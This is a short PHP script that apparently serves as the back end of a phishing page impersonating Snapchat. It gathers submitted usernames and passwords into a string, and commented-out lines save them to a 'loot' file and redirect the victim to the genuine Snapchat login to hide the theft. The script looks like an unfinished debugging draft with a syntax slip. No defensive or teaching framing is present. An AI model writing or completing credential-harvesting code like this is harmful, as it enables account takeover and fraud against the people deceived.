<?php

$deets = "Account: " . $_POST['username'] . " Password: " . $_POST['password'];

function customError($errno, $errstr) {
    echo "<b>Error:</b> [$errno] $errstr";
}
//sudo chown -R
//set error handler
set_error_handler("customError");

//fopen("/loot.txt","w");

$path =  "looteth/loot.txt";

echo "Path : $path | " ;//. phpinfo();

include "$path"


//file_put_contents("/var/www/html/accounts/looteth/loot.txt","penmios");

//print($deets);
//header('Location: https://accounts.snapchat.com/accounts/login');


//exit();

?>